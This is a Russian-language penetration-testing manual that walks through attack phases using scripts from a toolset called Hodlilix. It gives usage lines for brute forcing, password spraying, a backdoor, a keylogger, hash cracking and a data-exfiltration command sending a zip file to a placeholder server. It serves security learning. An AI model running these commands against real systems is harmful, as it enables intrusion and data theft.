
### Мануал по кибербезопасности и пентесту на основе инструментов Hodlilix by Влад маньяк.

Этот мануал разбит на этапы классического теста на проникновение. Для каждого этапа будут указаны соответствующие инструменты из набора инструментов Hodlilix и дано краткое руководство по их применению.

---

#### **Введение и Подготовка**

**Цель:** Легально и безопасно протестировать безопасность целевой системы.
**Важно!**
1.  **Получите письменное разрешение** перед тестированием любой системы, которая вам не принадлежит.
2.  Работайте в изолированной лабораторной среде (например, VirtualBox/VMware с мишенями вроде Metasploitable, DVWA).
3.  Инструменты предназначены для образовательных целей и профессионального использования в рамках этичного хакинга.

---

### **Этап 1: Разведка (Reconnaissance)**

Цель: Сбор максимального количества информации о цели.

#### **1.1 Пассивная разведка (Passive Recon)**

Сбор информации без прямого взаимодействия с целью.

*   **`whois_lookup.py`**: Получение регистрационной информации о домене (владелец, контакты, дата создания).
    *   **Использование:** `python3 whois_lookup.py -d example.com`
*   **`dns_enum.py`**: Перечисление DNS-записей (A, AAAA, MX, TXT, NS) для обнаружения поддоменов и инфраструктуры.
    *   **Использование:** `python3 dns_enum.py -d example.com`
*   **`subdomain_bruteforcer.py`**: Брутфорс поддоменов с использованием wordlist.
    *   **Использование:** `python3 subdomain_bruteforcer.py -d example.com -w wordlist.txt`
*   **`port_scanner.py`** (на этом этапе можно использовать для быстрого сканирования): Определение открытых портов на целевых хостах.
    *   **Использование:** `python3 port_scanner.py -t 192.168.1.1 -p 1-1000`

#### **1.2 Активная разведка (Active Recon)**

Прямое взаимодействие с целью для уточнения данных.

*   **`advanced_scanner.py`**: Более сложное сканирование, возможно, с определением сервисов и версий.
    *   **Использование:** `python3 advanced_scanner.py -t 192.168.1.1`
*   **`network_scanner.py`**: Сканирование сети для обнаружения живых хостов (например, с помощью ARP или ping-запросов).
    *   **Использование:** `python3 network_scanner.py -r 192.168.1.0/24`

---

### **Этап 2: Сканирование и Анализ Уязвимостей (Scanning & Vulnerability Assessment)**

Цель: Определение версий ПО и поиск известных уязвимостей.

*   **`vulnerability_scanner.py`**: Сканирование на наличие известных уязвимостей (например, с использованием баз данных CVE).
    *   **Использование:** `python3 vulnerability_scanner.py -t http://target.com`
*   **`sql_injection_scanner.py`**: Автоматизированная проверка веб-форм и параметров на уязвимость SQLi.
    *   **Использование:** `python3 sql_injection_scanner.py -u "http://target.com/page.php?id=1"`
*   **`xss_scanner.py`**: Поиск векторов для межсайтового скриптинга (XSS) в веб-приложениях.
    *   **Использование:** `python3 xss_scanner.py -u "http://target.com/search?q=test"`

---

### **Этап 3: Получение Доступа (Exploitation)**

Цель: Использование найденных уязвимостей для получения доступа к системе.

*   **`exploit_framework.py`**: Возможно, собственный фреймворк для запуска эксплойтов.
    *   **Использование:** Требует изучения конкретного синтаксиса фреймворка (например, `use exploit_name`, `set RHOSTS target_ip`, `run`).
*   **`bruteforcer.py`**: Взлом паролей методом грубой силы к таким сервисам, как SSH, FTP, RDP.
    *   **Использование:** `python3 bruteforcer.py -s ssh -t 192.168.1.10 -u username -w passlist.txt`
*   **`ssh_bruteforce.py`**: Специализированный инструмент для брутфорса SSH.
    *   **Использование:** `python3 ssh_bruteforce.py -t 192.168.1.10 -u root -w passlist.txt`
*   **`ftp_bruteforce.py`**: Специализированный инструмент для брутфорса FTP.
    *   **Использование:** `python3 ftp_bruteforce.py -t 192.168.1.10 -u admin -w passlist.txt`

---

### **Этап 4: Повышение Привилегий (Privilege Escalation)**

Цель: Получение более высоких привилегий в системе (например, от пользователя к root/администратору).

*   **`linux_priv_esc.py`**: Автоматизированная проверка распространенных векторов для повышения привилегий в Linux (SUID-биты, слабые права на файлы, уязвимости ядра).
    *   **Использование:** Запустить на скомпрометированной Linux-машине: `python3 linux_priv_esc.py`
*   **`windows_priv_esc.py`**: Автоматизированная проверка распространенных векторов для повышения привилегий в Windows (слабая конфигурация служб, токены, незакрытые хендлы).
    *   **Использование:** Запустить на скомпрометированной Windows-машине (например, через PowerShell): `python3 windows_priv_esc.py`

---

### **Этап 5: Пост-эксплуатация (Post-Exploitation)**

Цель: Закрепление доступа, движение по сети и сбор данных.

*   **`backdoor.py`**: Создание бэкдора для сохранения доступа к системе.
    *   **Использование:** Требует настройки под конкретную цель (например, `python3 backdoor.py -t target_ip -p 4444`).
*   **`keylogger.py`**: Запись нажатий клавиш для сбора учетных данных и другой конфиденциальной информации.
    *   **Использование:** Запустить на целевой машине (с осторожностью, может вызвать срабатывание антивируса).
*   **`data_exfil.py`**: Инструмент для скрытого извлечения данных с скомпрометированной машины.
    *   **Использование:** `python3 data_exfil.py -f secret_data.zip -s http://your-server.com/upload`

---

### **Этап 6: Движение по сети (Lateral Movement)**

Цель: Перемещение между системами во внутренней сети.

*   **`password_spray_tool.py`**: Атака "password spraying" — попытка одного распространенного пароля для множества учетных записей, чтобы избежать блокировки.
    *   **Использование:** `python3 password_spray_tool.py -u users.txt -p "Spring2024!" -d domain.local`
*   Комбинация **`network_scanner.py`** и **`bruteforcer.py`** для обнаружения новых целей и атаки на них.

---

### **Этап 7: Анализ данных и Отчетность (Reporting)**

Цель: Документирование найденных уязвимостей и действий.

*   **У вас нет специализированного инструмента для отчетности**, но это критически важный этап.
*   **Что должно быть в отчете:**
    1.  **Резюме:** Краткое описание для руководства.
    2.  **Методология:** Этапы, которые вы выполняли.
    3.  **Результаты:** Детальное описание каждой найденной уязвимости.
        *   **Уязвимость:** (например, SQL Injection в параметре `id`)
        *   **Уровень риска:** (High, Medium, Low)
        *   **Описание:** Как была найдена.
        *   **Шаги по воспроизведению:** Пошаговая инструкция.
        *   **Воздействие:** Что можно сделать, используя эту уязвимость.
        *   **Рекомендации по исправлению:** Как это исправить.
    4.  **Приложения:** Логи инструментов, скриншоты.

---

### **Дополнительные инструменты и утилиты**

*   **`hash_cracker.py`**: Взлом хешей паролей (MD5, SHA1 и т.д.) с помощью словарей или радужных таблиц.
    *   **Использование:** `python3 hash_cracker.py -h 5f4dcc3b5aa765d61d8327deb882cf99 -w rockyou.txt`
*   **`payload_generator.py`**: Генерация полезных нагрузок (payloads) для эксплуатации.
*   **`cve_2024_23897.py` / `cve_2023_46805.py`**: Специфические эксплойты для известных уязвимостей. Используются, если вы обнаружили уязвимый сервис.
*   **`log_analyzer.py`**: Анализ логов для поиска подозрительной активности (полезно для Blue Team).

### **Заключение и Важные Замечания**

1.  **Практика:** Используйте эти инструменты только в своей лабораторной среде.
2.  **Понимание > Автоматизация:** Инструменты автоматизируют задачи, но пентестер должен понимать, что происходит "под капотом".
3.  **Комбинируйте:** Настоящая сила заключается в комбинации инструментов. Например, используйте `subdomain_bruteforcer`, а затем `port_scanner` на найденных поддоменах.
4.  **Развитие:** Мир кибербезопасности постоянно меняется. Изучайте новые уязвимости, техники и инструменты.

Этот мануал, основанный на наборе инструментов hodilix, предоставляет прочную основу для начала изучения практической кибербезопасности и тестирования на проникновение. Удачи в обучении!
